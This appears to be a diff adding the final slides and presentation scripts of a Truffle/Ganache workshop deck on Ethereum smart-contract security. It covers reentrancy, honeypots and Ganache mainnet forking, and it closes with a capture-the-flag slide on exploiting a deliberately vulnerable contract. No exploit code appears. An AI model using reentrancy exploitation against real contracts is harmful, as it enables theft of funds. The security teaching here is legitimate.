+                    </tr>
+                </tbody>
+            </table>
+            </div>
+        </div>
+        <small>More Info: <a href="https://www.usenix.org/system/files/sec19-torres.pdf" rel="noopener" target="_blank">The Art of The Scam: Demystifying Honeypots in
+            Ethereum Smart Contracts</a> <img src="./img/pdf.svg" style="opacity:.8;height: 24px;vertical-align: middle"></small>
+        <br/><small><small><small></small><small>You really should read some of this. <small>(hint hint)</small></small></small></small></small>
+    </div>
+
+    <div id="pentesting-safely" class="step audio-slide" data-x="1920" data-y="3840" data-z="0" data-rotate="0" data-rotate-x="-120" data-rotate-y="-120">
+        <div class="notes">
+            Don’t forget to say "Here is a re-enactment of Ganache in action."
+        </div>
+        <h2>The Trace Buster Buster</h2>
+        <center><p>Ganache Forking enables us to <em>emulate</em> sending transactions to Mainnet contracts, without any costs or risk of loss.</p></center>
+        <div class="code">
+            <div class="code-lang" id="trace-buster-title" style="margin-top:2.4vw;transition:margin-top 1.25s ease-in-out;transition-delay:.75s;">The Big Hit (1998)</div>
+            <div class="code-inner">
+                <pre><code style="width:60vw;height:30.75vw;overflow:hidden;"><div style="box-shadow:inset 0 0 10vw black;position:absolute;left:0;top:0;right:0;bottom:0">
+                    <video src="./img/static.mp4" muted autoplay loop style="opacity:.6;position:absolute;left:0;top:0;transition:height .1s ease;height: 110%;
+                    right:0;
+    margin: auto;
+    bottom: 0;" id="trace-buster-static"></video>
+                </div>
+                <div class="substep video" id="trace-buster-video">
+                    <video style="opacity:.7" src="./img/trace-buster.mp4"></video>
+                </div></code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="questions" class="step slide" data-x="1920" data-y="3840" data-z="1920" data-rotate="0" data-rotate-x="-60" data-rotate-y="-60">
+        <h2>What we’ve covered:</h2>
+        <div style="display:flex;">
+                <ul>
+                    <li>Truffle</li>
+                    <li>Ganache & Ganache Forking</li>
+                    <li>Gas</li>
+                    <li>Fallback Functions</li>
+                </ul>
+                <ul>
+                    <li>Reentrancy, Exploit, Testing, DAO</li>
+                    <li>Constantinople & Istanbul</li>
+                    <li>Reentrancy Protection</li>
+                    <li>Honeypot</li>
+                </ul>
+            </ul>
+        </div>
+        <h1 class="substep">Questions?</h1>
+    </div>
+
+    <div id="workshop-time" class="step slide" data-x="1920" data-y="3840" data-z="1920" data-rotate="0" data-rotate-x="-60" data-rotate-y="-60">
+        <h2>Workshop Time!</h2>
+        <h4>Get ready: </h4>
+        <ul>
+            <li>View these slides at: <a href="#/workshop-time">trfl.co/workshop</a></li>
+            <li>Install <a href="https://nodejs.org/" target="_blank">Node.js</a> v10</li>
+            <li>Download <a href="https://github.com/trufflesuite/ganache-ui/releases/tag/v2.2.1-alpha.0" target="_blank" rel="noopener">Ganache UI Alpha</a> or run <code>npm install -g <a href="https://www.npmjs.com/package/ganache-cli" rel="noopener" target="_blank">ganache-cli</a></code></li>
+            <li>Clone the workshop repo: <code>git clone <a href="https://trfl.co/honeypot-exploration" target="_blank" rel="noopener">https://github.com/trufflesuite/devcon5-honeypot-exploration</a></code></li>
+            <li>Init the workshop repo: <code>npm install</code></li>
+        </ul>
+    </div>
+
+    <div id="workshop-blank" class="step slide only-workshop" data-x="1920" data-y="3840" data-z="1920" data-rotate="0" data-rotate-x="-60" data-rotate-y="-60">
+        <div></div>
+    </div>
+
+    <div id="workshop-recap" class="step slide only-workshop" data-x="1920" data-y="3840" data-z="1920" data-rotate="0" data-rotate-x="-60" data-rotate-y="-60">
+        <h2>Workshop Recap</h2>
+        <h4>Used Ganache and Ganache Forking to detect a honeypot</h4>
+        <div style="display:flex;width:50vw;margin:auto">
+            <ul style="list-style:none">
+                <li><h3>Without Forking</h3></li>
+                <li>1. Started Ganache</li>
+                <li>2. Deployed contract</li>
+                <li>3. Ran test</li>
+                <li>4. Exploit worked!</li>
+            </ul>
+            <ul style="list-style:none">
+                <li><h3>Ganache Mainnet Forking</h3></li>
+                <li>1. Started Ganache</li>
+                <li>2. Deployed contract</li>
+                <li>3. Ran test</li>
+                <li>4. Exploit failed‽</li>
+            </ul>
+        </div>
+    </div>
+
+    <div id="ctf" class="step slide only-workshop" data-x="1920" data-y="3840" data-z="1920" data-rotate="0" data-rotate-x="-60" data-rotate-y="-60">
+        <h2>Capture the Flag</h2>
+        <h4><strike>Steal</strike>Win 1 Ether by exploiting a reentrancy attack in our specially crafted, extra sticky, contract!</h4>
+        <p style="text-align: center">Be careful though; if you hit a honeypot you’ll get locked out!</p>
+        <h3 style="text-align: center">Contract address: <strong>0x_______________________</strong></h3>
+        <br/>
+        <h3 style="text-align: center"><a href="https://trfl.co/honeypot" target="_blank" rel="noopener" style="text-transform: lowercase; font-size:2em">trfl.co/honeypot</a></h3>
+    </div>
+
+    <div id="winner" class="step slide only-workshop" data-x="1920" data-y="3840" data-z="1920" data-rotate="0" data-rotate-x="-60" data-rotate-y="-60">
+        <script>
+            // editor note: to execute the exploit a user must have registered a "username" that will be displayed here
+            // TODO: add code to fetch contract info from our contract
+        </script>
+    </div>
+
+    <!-- <div id="overview" class="step" data-x="0" data-y="-1000" data-z="4000" data-scale="8" data-rotate-x="20"></div> -->
+    <div id="qr" class="step" data-x="0" data-y="0" data-z="0">
+        <center>
+            <img src="./img/security_slideQR.png" style="height:90vh;width:auto;" />
+        </center>
+    </div>
+</div>
+
+<script>
+    if (document.location.host.indexOf("trufflesuite.com") !== -1) {
+        document.querySelectorAll(".only-workshop").forEach(e=>e.parentNode.removeChild(e));
+    }
+</script>
+<script>
+        let animationFrame = null;
+        const testingVideo = document.getElementById("testing-video");
+        if (testingVideo) {
+            testingVideo.onclick = () => {
+                testingVideo.onclick = null;
+
+                const ctx = new AudioContext();
+                const audioSrc = ctx.createMediaElementSource(document.getElementById("testing-video"));
+                const analyser = ctx.createAnalyser();
+                analyser.smoothingTimeConstant = 0.1;
+                audioSrc.connect(analyser);
+                audioSrc.connect(ctx.destination);
+
+                const frequencyData = new Uint8Array(analyser.frequencyBinCount);
+                const barsArr = [];
+                const barsEl = document.getElementById("bars");
+                const count = 25;
+                for (let i = 0; i < count; i++) {
+                    const nunode = document.createElement("div");
+                    nunode.classList.add("bar");
+                    barsArr.push(nunode.style);
+                    barsEl.appendChild(nunode);
+                }
+                const height = barsEl.offsetHeight;
+                const max = 256;
+                const skip = 21;
+                let d = Date.now();
+                let frames = 0;
+                function renderFrame() {
+                    frames++;
+                    animationFrame = requestAnimationFrame(renderFrame);
+                    analyser.getByteFrequencyData(frequencyData);
+                    // render frame based on values in frequencyData
+                    for (let i = 0; i < count; i++) {
+                        const bar = barsArr[i];
+                        const s = i*skip;
+                        const curve = ((0.01 * i)**3) + 1;
+                        let sums = 0;
+                        let count = 0;
+                        for (var j = 0; j < skip; j++) {
+                            var d = frequencyData[96 + s + j];
+                            if (d > 0) {
+                                count++;
+                                sums += d;
+                            }
+                        }
+                        const avg = sums / count || 0;
+                        let h = ~~(((avg * curve)/max) * height);
+                        h -= (h + 14) % 14;
+                        bar.height = h + "px";
+                    }
+                }
+                renderFrame();
+            };
+            let audioSlidesEnabled = true;
+            function toggleAudioSlides(el) {
+            el.innerText = audioSlidesEnabled ? "Enable Audio Slides" : "Disable Audio Slides";
+            var slides = document.querySelectorAll(".audio-slide");
+            slides.forEach(s => {
+                if (audioSlidesEnabled) {
+                    if (s.classList.contains("step")) {
+                        s.classList.remove("step")
+                        s.classList.add("_step")
+                    }
+                    if (s.classList.contains("substep")) {
+                        s.classList.remove("substep")
+                        s.classList.add("_substep")
+                    }
+                    s.style.display = "none";
+                } else {
+                    if (s.classList.contains("_step")) {
+                        s.classList.remove("_step")
+                        s.classList.add("step")
+                    }
+                    if (s.classList.contains("_substep")) {
+                        s.classList.remove("_substep")
+                        s.classList.add("substep")
+                    }
+                    s.style.display = "";
+                }
+            });
+            audioSlidesEnabled = !audioSlidesEnabled
+        }
+    }
+</script>
+<script src="js/impress.js"></script>
+<script>
+    hljs.registerLanguage("solidity", window.hljsDefineSolidity);
+</script>
+<script>
+    (() => {
+        const show = impress();
+        let readyCount = 0;
+        function checkReady(){
+            if (readyCount >=2) {
+                document.body.classList.add("loaded");
+            }
+        }
+        window.onload = () => {
+            readyCount++;
+            checkReady();
+        }
+        document.fonts.ready.then(() => {
+            readyCount++;
+            checkReady();
+        });
+        init();
+        function init() {
+            show.init();
+            const rootElement = document.getElementById("impress");
+            let video;
+            function reset() {
+                if (video) {
+                    video.pause();
+                    video.currentTime = 0;
+                    video.removeEventListener("ended", next);
+                }
+                // something weird causes this video to be weird.
+                const testingVideo = document.getElementById("testing-video");
+                if (testingVideo) {
+                    testingVideo.pause();
+                }
+                window.cancelAnimationFrame(animationFrame);
+            }
+            function next() {
+                reset();
+                show.next();
+            }
+            rootElement.addEventListener("impress:stepenter", function(event) {
+                reset();
+            });
+            rootElement.addEventListener("impress:stepenter", function(event) {
+                reset();
+                if(event.target.id == "forking") {
+                    const win = document.getElementById("ganache-ui-forking").contentWindow;
+                    if (win.start) {
+                        win.start();
+                    } else {
+                        win.onload = ()=>{
+                            win.start();
+                        }
+                    }
+                }
+            });
+            rootElement.addEventListener("impress:substep:leave", function(event) {
+                reset();
+            });
+            rootElement.addEventListener("impress:substep:enter", function(event) {
+                const currentStep = event.detail.substep;
+                if (video) {
+                    reset();
+                }
+                if(currentStep.classList.contains("video")){
+                    video = currentStep.getElementsByTagName("video")[0];
+                    video.addEventListener("ended", next);
+                    video.pause();
+                    video.currentTime = 0;
+                    video.play();
+                }
+                if (currentStep.id === "trace-buster-video") {
+                    document.getElementById("trace-buster-static").style.height = 0;
+                    document.getElementById("trace-buster-title").style.marginTop = 0;
+                }
+            });
+        }
+    })();
+</script>
+
+    <div style="visibility: hidden; position: absolute; width: 0px; height: 0px;">
+        <svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+            <path id="hexagon" d="M331.68772964944 8.499999999999998Q346.41016151377545 0 361.1325933781109 8.499999999999998L678.0978911632154 191.5Q692.8203230275509 200 692.8203230275509 217L692.8203230275509 583Q692.8203230275509 600 678.0978911632154 608.5L361.1325933781109 791.5Q346.41016151377545 800 331.68772964944 791.5L14.722431864335459 608.5Q0 600 0 583L0 217Q0 200 14.722431864335459 191.5Z"></path>
+        </svg>
+    </div>
+
+    <svg class="shapes inner" width="693" height="800" viewbox="0 0 692.8203230275509 800"><use href="#hexagon"></use></svg>
+    <svg class="shapes middle" width="693" height="800" viewbox="0 0 692.8203230275509 800"><use href="#hexagon"></use></svg>
+    <svg class="shapes outer" width="693" height="800" viewbox="0 0 692.8203230275509 800"><use href="#hexagon"></use></svg>
+    <svg class="animated shapes inner" width="693" height="800" viewbox="0 0 692.8203230275509 800"><use href="#hexagon"></use></svg>
+    <svg class="animated shapes middle" width="693" height="800" viewbox="0 0 692.8203230275509 800"><use href="#hexagon"></use></svg>
+    <svg class="animated shapes outer" width="693" height="800" viewbox="0 0 692.8203230275509 800"><use href="#hexagon"></use></svg>
+
+    <div id="tube"></div>
+
+</body>
+</html>
